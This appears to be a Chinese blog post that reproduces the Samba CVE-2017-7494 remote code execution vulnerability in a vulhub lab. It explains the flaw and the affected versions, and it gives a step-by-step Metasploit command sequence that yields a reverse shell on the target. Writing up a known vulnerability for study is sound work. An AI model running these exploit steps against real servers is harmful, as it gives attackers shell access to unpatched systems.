---
layout: post
title: Samba 远程命令执行漏洞
tags: Samba
categories: CVE-2017-7494
---

# Samba 远程命令执行漏洞（CVE-2017-7494）

## 漏洞描述

Samba是Linux和UNIX系统的SMB协议服务软件，可以实现与其他操作系统（如：微软Windows操作系统）进行文件系统、打印机和其他资源的共享。

该漏洞是由于Samba允许连接一个远程的命名管道，并且在连接前会调用is_known_pipename()函数验证管道名称是否合法。在is_known_pipename()函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。

漏洞利用条件：

1.服务器打开了文件/打印机共享端口445，让其能够在公网上访问

2.共享文件拥有写入权限

3.恶意攻击者需猜解Samba服务端共享目录的物理路径

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。

环境运行后，监听445端口，默认开启了一个共享“myshare”，共享的目录为/home/share，可读可写。使用smbclient连接：

```
apt install smbclient
smbclient //smb-ip/myshare -N
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Samba/CVE-2017-7494/15946333080849.jpg)

查看版本，属于漏洞范围

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Samba/CVE-2017-7494/15946338485155.jpg)

使用kali自带的metasploit进行测试

```
msfconsole
search CVE-2017-7494
use exploit/linux/samba/is_known_pipename
show options
set RHOSTS 目标IP
set RPORT 445（samba端口默认445)
set SMB_FOLDER //以下两个路径如果知道可以设置，不知道可以不设置，metasploit会自动爆破
set SMB_SHARE_NAME
run
```
启动

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Samba/CVE-2017-7494/15946346331674.jpg)

使用漏洞利用脚本
![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Samba/CVE-2017-7494/15946347735258.jpg)

设置必要参数

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Samba/CVE-2017-7494/15946349798149.jpg)

运行检测，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Samba/CVE-2017-7494/15946350772875.jpg)

## 受影响版本

Samba 3.5.0到4.6.4/4.5.10/4.4.14的中间版本，在4.6.4/4.5.10/4.4.14修复了这个漏洞。

## 参考链接

https://www.freebuf.com/vuls/135624.html

https://www.cnblogs.com/Hi-blog/p/7782356.html